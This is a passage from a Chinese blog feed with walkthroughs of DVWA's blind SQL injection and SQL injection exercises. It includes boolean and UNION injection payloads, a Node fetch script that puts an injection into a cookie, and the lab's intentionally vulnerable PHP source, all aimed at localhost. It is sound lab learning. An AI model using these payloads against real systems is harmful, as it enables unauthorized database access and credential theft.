&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-user&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;referrerPolicy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=999+or+1%3D1;+--+&amp;amp;Submit=Submit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875.png"
width="275"
height="127"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875_hue3004388d8f7ebb1b8e1a4e7c063a876_6853_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875_hue3004388d8f7ebb1b8e1a4e7c063a876_6853_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428092945875"
class="gallery-image"
data-flex-grow="216"
data-flex-basis="519px"
>&lt;/p>
&lt;p>在&lt;code>id=999 or 1=1; --&lt;/code>这个payload下返回了 &lt;code>exists&lt;/code>，剩下的就是和 Low 难度差不多的方式爆破出版本号，就不复述了。&lt;/p>
&lt;h3 id="high难度收集信息">High难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965.png"
width="322"
height="226"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965_hua6d17fe928e830e032cdd493fe5241e6_10316_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965_hua6d17fe928e830e032cdd493fe5241e6_10316_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428093304965"
class="gallery-image"
data-flex-grow="142"
data-flex-basis="341px"
>&lt;/p>
&lt;p>和SQL注入题的High难度差不多，但注意到题中提示变成了 &lt;code>Cookie ID set!&lt;/code>，于是看一眼 Cookie。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840.png"
width="462"
height="57"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840_huafac5c1c1ab8d99e6aa0d3cebbb5bbd0_4571_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840_huafac5c1c1ab8d99e6aa0d3cebbb5bbd0_4571_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428093423840"
class="gallery-image"
data-flex-grow="810"
data-flex-basis="1945px"
>&lt;/p>
&lt;p>id直接保存在cookies里，这就简单多了。&lt;/p>
&lt;h3 id="high难度解题">High难度：解题&lt;/h3>
&lt;p>复制出请求（注意复制出 NodeJS fetch，复制浏览器 fetch 不会复制出cookie），把cookie里的id改成&lt;code>0 or 1=1 --&lt;/code>，URL编码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">let&lt;/span> &lt;span class="nx">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cookie&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=0 or 1=1 -- ; PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=high&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Referer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Referrer-Policy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;GET&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>初始化一个node包（&lt;code>package.json&lt;/code>把&lt;code>type&lt;/code>设置成&lt;code>module&lt;/code>），安装&lt;code>node-fetch&lt;/code>，补个 &lt;code>import fetch from &amp;quot;node-fetch&amp;quot;;&lt;/code> 然后调试上面的脚本，发现提示 MISSING。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913.png"
width="398"
height="74"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913_huf62e30a3957d9ddbae2f6500df0b0dd5_6114_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913_huf62e30a3957d9ddbae2f6500df0b0dd5_6114_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428095318913"
class="gallery-image"
data-flex-grow="537"
data-flex-basis="1290px"
>&lt;/p>
&lt;p>难道是字符型注入？改成&lt;code>' or 1=1 --&lt;/code>再试一次。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005.png"
width="381"
height="67"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005_hu206a8a9164fccec6065813bd0974fd58_8234_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005_hu206a8a9164fccec6065813bd0974fd58_8234_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428095720005"
class="gallery-image"
data-flex-grow="568"
data-flex-basis="1364px"
>&lt;/p>
&lt;p>这次提示变成了exists，所以是字符型注入。接下来就是用 Low 难度的 Payload 一个一个试过去，爆破出版本号。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>说说我打完盲注的想法。其实最大的问题是没信心，不知道到底什么结果，没有任何错误提示。有源码的情况下白盒还比较容易构造 payload，黑盒的情况下盲注构造payload倒是很考验心态，因为总是不成功没反应打击很大，会怀疑是不是自己判断错了。&lt;/p>
&lt;p>而且很费时间。&lt;/p>
&lt;p>想确认是否有注入点感觉最好的办法还是先拿工具脚本试水。不过有防火墙的情况下可能又有问题=。=像是&lt;code>or 1=1&lt;/code>这种payload很可能被杀。工具没辙的时候还得看人有没有新点子，但这又是大佬的领域了&amp;hellip;&lt;/p>
&lt;p>嗯，我也想做大佬啊。&lt;/p></description></item><item><title>DVWA上手记录-SQL注入</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</link><pubDate>Wed, 27 Apr 2022 15:43:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>拼字符串，和命令注入原理一样。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>Low难度下SQL注入是一个简单的表单。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135511588.png"
width="554"
height="260"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135511588_hub07b0edd99b217881ccdcccc18c385fd_19797_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135511588_hub07b0edd99b217881ccdcccc18c385fd_19797_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135511588"
class="gallery-image"
data-flex-grow="213"
data-flex-basis="511px"
>&lt;/p>
&lt;p>随便提交什么东西注意到地址栏变化。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135532773.png"
width="496"
height="59"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135532773_hu6a0da43ddc23bfb6af10f644ca1b64bf_5365_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135532773_hu6a0da43ddc23bfb6af10f644ca1b64bf_5365_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135532773"
class="gallery-image"
data-flex-grow="840"
data-flex-basis="2017px"
>&lt;/p>
&lt;p>尝试提高难度继续观察。Medium难度下表单如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135617461.png"
width="371"
height="178"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135617461_hu0a9dfdf5ac88fb9daf47e4f628f987f7_7860_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135617461_hu0a9dfdf5ac88fb9daf47e4f628f987f7_7860_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135617461"
class="gallery-image"
data-flex-grow="208"
data-flex-basis="500px"
>&lt;/p>
&lt;p>High难度表单如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135110188.png"
width="724"
height="444"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135110188_hu0cff8eb887f9a62e6151f779494ecc79_46075_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135110188_hu0cff8eb887f9a62e6151f779494ecc79_46075_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135110188"
class="gallery-image"
data-flex-grow="163"
data-flex-basis="391px"
>&lt;/p>
&lt;p>任务是窃取用户1~5的密码。&lt;/p>
&lt;h3 id="low-难度">Low 难度&lt;/h3>
&lt;p>手工注入，先尝试用经典的&lt;code>'&lt;/code>来检测。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135902575.png"
width="1074"
height="96"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135902575_hud9bcdfead344ebea607c929391fabaf7_9497_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427135902575_hud9bcdfead344ebea607c929391fabaf7_9497_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427135902575"
class="gallery-image"
data-flex-grow="1118"
data-flex-basis="2685px"
>&lt;/p>
&lt;p>存在注入。比较菜，继续前先看看源码再决定用什么 payload。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_DVWA&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SQLI_DB&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">MYSQL&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_assoc&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">SQLITE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// 略 ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>目标SQL是&lt;code>SELECT first_name, last_name FROM users WHERE user_id = '$id'&lt;/code>。在不知道被注入的SQL长什么样的时候其实比较倾向于连接一个布尔表达式，这样就有一个比较稳定的1比特观察窗口，可以拿来判断是否存在用户或者逐位猜解用户名、密码、字段名什么的。&lt;/p>
&lt;p>这里先尝试连接一个 &lt;code>' or 1=1 -- &lt;/code> 确定注入的格式（注意 &lt;code>--&lt;/code>后面接一个空格），但暂时不会用这个方式注入。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427141637645.png"
width="382"
height="419"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427141637645_hue2e4a6d077791d7aeae06767a61d87e9_11310_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427141637645_hue2e4a6d077791d7aeae06767a61d87e9_11310_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427141637645"
class="gallery-image"
data-flex-grow="91"
data-flex-basis="218px"
>&lt;/p>
&lt;p>先尝试下 &lt;code>union&lt;/code> 联查一下表名,&lt;code>' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables;--&lt;/code>，得到这样的输出。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143108884.png"
width="678"
height="627"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143108884_hue95434ff54181a3e552cad74dc79c640_24492_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143108884_hue95434ff54181a3e552cad74dc79c640_24492_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143108884"
class="gallery-image"
data-flex-grow="108"
data-flex-basis="259px"
>&lt;/p>
&lt;p>太长不全部截图了。接下来注意看一下可疑的表，直接 ctrl+f 在网页里搜 &lt;code>user&lt;/code>，很快找到这里：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143202464.png"
width="625"
height="71"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143202464_hu307659ad2afc97f1beb113925ecf5d18_1850_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143202464_hu307659ad2afc97f1beb113925ecf5d18_1850_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143202464"
class="gallery-image"
data-flex-grow="880"
data-flex-basis="2112px"
>&lt;/p>
&lt;p>接着找出 &lt;code>users&lt;/code> 表的字段名，还是通过 &lt;code>information_schema&lt;/code> ，新的 payload如下。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="s1">&amp;#39; UNION SELECT c.COLUMN_NAME,c.COLUMN_TYPE FROM information_schema.`COLUMNS` c WHERE c.TABLE_SCHEMA =&amp;#39;&lt;/span>&lt;span class="n">dvwa&lt;/span>&lt;span class="s1">&amp;#39; AND c.TABLE_NAME =&amp;#39;&lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="s1">&amp;#39;; --
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143506909.png"
width="646"
height="519"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143506909_hue89a969cdf307e28a18e20ab7378474c_16373_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427143506909_hue89a969cdf307e28a18e20ab7378474c_16373_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427143506909"
class="gallery-image"
data-flex-grow="124"
data-flex-basis="298px"
>&lt;/p>
